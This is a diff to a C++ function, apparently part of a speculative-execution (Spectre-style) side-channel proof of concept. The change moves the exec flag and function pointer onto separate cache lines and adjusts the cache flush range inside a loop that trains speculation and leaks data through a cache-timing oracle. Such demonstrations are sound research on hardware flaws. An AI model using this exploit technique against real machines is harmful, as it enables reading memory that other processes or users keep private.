@@ -41,8 +41,8 @@ char train_and_leak() {
     const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();
     const unsigned CONVERGE_ITERATIONS = 100000;
 
-    bool* exec = new bool;
-    functype* val = new functype;
+    bool* exec = new bool[10000]; // make sure it's a different cacheline from val - not even neighboring cacheline
+    functype* val = new functype[100]; // likewise make sure it's a different cacheline from exec
 
     // 0. Call once to set up function table addr
     *exec = true;
@@ -69,7 +69,7 @@ char train_and_leak() {
         *exec = false;
 
         // 4. Flush exec
-        FlushFromDataCache_GuestAddr(exec - 8, exec + 8);
+        FlushFromDataCache_GuestAddr(exec, exec + 7);
 
         MemoryAndSpeculationBarrier();
 
